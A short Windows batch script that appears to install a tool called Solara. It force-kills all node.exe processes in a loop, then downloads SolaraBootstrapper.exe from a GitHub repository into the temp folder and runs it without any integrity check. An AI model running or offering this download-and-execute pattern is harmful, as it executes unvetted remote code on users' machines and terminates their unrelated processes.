@echo off
setlocal

set "URL=https://github.com/quivings/Solara/raw/main/Files/SolaraBootstrapper.exe"
set "FOLDER_PATH=%TEMP%\Solara.Dir"
set "DOWNLOAD_PATH=%FOLDER_PATH%\SolaraBootstrapper.exe"

echo Checking if the folder Solara.Dir exists...
if not exist "%FOLDER_PATH%" (
    echo Folder does not exist. Creating folder...
    mkdir "%FOLDER_PATH%"
)

echo Terminating node.exe processes...

:loop
tasklist /FI "IMAGENAME eq node.exe" 2>NUL | find /I /N "node.exe">NUL
if "%ERRORLEVEL%"=="0" (
    echo node.exe found, attempting to terminate...
    taskkill /F /IM node.exe /T
    timeout /T 2 /NOBREAK > NUL
    goto loop
) else (
    echo No node.exe processes found.
)

echo Downloading .exe file...
curl -L -o "%DOWNLOAD_PATH%" "%URL%"
if %ERRORLEVEL% neq 0 (
    echo Error: Failed to download file.
    pause
    exit /b 1
)

if not exist "%DOWNLOAD_PATH%" (
    echo Download failed! File not found.
    pause
    exit /b 1
)

echo Waiting for 1 second before starting the executable...
timeout /T 1 /NOBREAK > NUL

echo Running the downloaded executable...
start "" "%DOWNLOAD_PATH%"

echo Done.
pause
